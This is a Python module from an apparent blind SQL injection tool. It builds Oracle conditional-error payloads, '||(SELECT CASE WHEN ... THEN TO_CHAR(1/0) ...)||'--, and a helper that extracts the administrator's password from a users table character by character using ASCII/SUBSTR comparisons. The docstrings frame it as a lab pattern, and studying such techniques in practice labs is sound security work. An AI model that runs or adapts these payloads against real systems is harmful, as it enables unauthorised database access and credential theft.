"""Payload builders for conditional-error SQL injection."""

from dataclasses import dataclass

from .contracts import PayloadBuilder


@dataclass(frozen=True, slots=True)
class ConditionalErrorPayloadBuilder(PayloadBuilder):
    """Wrap a condition with the Oracle-style conditional-error payload used in labs."""

    prefix: str = "'||(SELECT CASE WHEN ("
    suffix: str = ") THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'--"
    username: str = "administrator"
    table: str = "users"
    target_column: str = "password"
    substring_function: str = "SUBSTR"

    def __post_init__(self) -> None:
        if not self.prefix:
            raise ValueError("prefix cannot be empty")
        if not self.suffix:
            raise ValueError("suffix cannot be empty")
        if not self.username:
            raise ValueError("username cannot be empty")
        if not self.table:
            raise ValueError("table cannot be empty")
        if not self.target_column:
            raise ValueError("target_column cannot be empty")
        if self.substring_function not in {"SUBSTR", "SUBSTRING"}:
            raise ValueError("substring_function must be SUBSTR or SUBSTRING")

    @classmethod
    def for_oracle(cls, *, table: str, user_column: str, username: str) -> "ConditionalErrorPayloadBuilder":
        """Create a builder with a configurable Oracle row-selection context."""
        if not all(value.strip() for value in (table, user_column, username)):
            raise ValueError("table, user_column, and username cannot be empty")
        return cls(
            suffix=(
                ") THEN TO_CHAR(1/0) ELSE NULL END FROM "
                f"{table} WHERE {user_column}='{username}')||'--"
            ),
            username=username,
            table=table,
        )

    def build(self, condition: str) -> str:
        if not condition.strip():
            raise ValueError("condition cannot be empty")
        return f"{self.prefix}{condition}{self.suffix}"

    def build_for(self, expression: str, position: int, operator: str, value: int) -> str:
        """Convenience helper for the Oracle conditional-error lab pattern."""
        if not expression.strip():
            raise ValueError("expression cannot be empty")
        if position < 1:
            raise ValueError("position must be positive")
        if operator not in {"=", ">", ">=", "<", "<=", "<>"}:
            raise ValueError(f"Unsupported comparison operator: {operator}")
        if not isinstance(value, int) or isinstance(value, bool):
            raise TypeError("value must be an integer")

        formatted = expression.strip()
        if formatted.startswith("(") and formatted.endswith(")"):
            formatted = formatted[1:-1]

        condition = f"ASCII({self.substring_function}({formatted},{position},1)){operator}{value}"
        return self.build(condition)
